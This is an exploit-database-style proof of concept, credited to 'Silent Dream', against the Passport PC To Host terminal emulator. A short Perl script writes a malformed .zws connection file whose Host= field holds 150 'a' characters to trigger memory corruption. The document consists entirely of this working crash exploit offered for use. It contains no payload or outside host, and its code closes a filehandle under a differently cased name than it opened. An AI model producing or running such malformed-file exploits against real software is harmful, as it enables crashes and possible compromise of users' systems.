# Exploit Title: Passport PC To Host Malformed .zws file Memory Corruption
# Date: 3-3-12
# Author: Silent Dream
# Software Link: http://www.zephyrcorp.com/terminal-emulation/
# Version: Latest (2011-506-S)
# Tested on: Windows XP SP3

my $file = "passport_pwn.zws";
my $head = "[Connection]\nHost=";
my $junk = "a" x 150;
open($File, ">$file");
print $File $head.$junk;
close($FILE);